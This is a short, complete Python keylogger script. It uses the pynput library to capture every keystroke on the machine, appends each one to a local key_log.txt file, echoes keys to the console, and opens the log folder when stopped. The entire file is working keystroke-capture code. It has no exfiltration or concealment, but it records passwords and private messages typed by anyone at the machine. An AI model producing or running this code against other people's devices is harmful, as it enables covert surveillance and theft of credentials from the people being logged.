from pynput import keyboard
import os
import subprocess

log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "key_log.txt")

def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_press(key):
    print(f"Pressed: {key}")
    write_to_file(key)

try:
    with keyboard.Listener(on_press=on_press) as listener:
        print("✅ Keylogger is running. Press Ctrl+C to stop.")
        listener.join()
except KeyboardInterrupt:
    print("\n🛑 Stopped by user.")
    subprocess.call(['open', log_dir])
